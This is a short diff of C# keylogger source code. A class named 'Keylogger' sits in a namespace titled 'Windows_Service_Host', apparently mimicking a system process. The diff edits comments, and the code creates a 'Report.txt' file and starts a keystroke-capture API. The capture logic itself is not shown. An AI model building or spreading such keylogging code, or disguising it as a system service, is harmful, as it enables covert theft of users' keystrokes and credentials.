@@ -19,18 +19,17 @@ namespace Windows_Service_Host
     class Keylogger
     {
 
-
+        // createFile creates an empty text file in the program directory.
+        // side effects: creates a text file.
         public static void createFile()
         {
             using (FileStream fs = File.Create("Report.txt"))
             {
-                //Byte[] info = new UTF8Encoding(true).GetBytes("");
-                //fs.Write(info, 0, info.Length);
             }
         }
         
         // The main method displays the date and outputs any keystrokes typed while the program is opened.
-        // side effects: console output
+        // side effects: console output, writing to file
         static void Main(string[] args)
         {
             using (var api = new KeystrokeAPI())
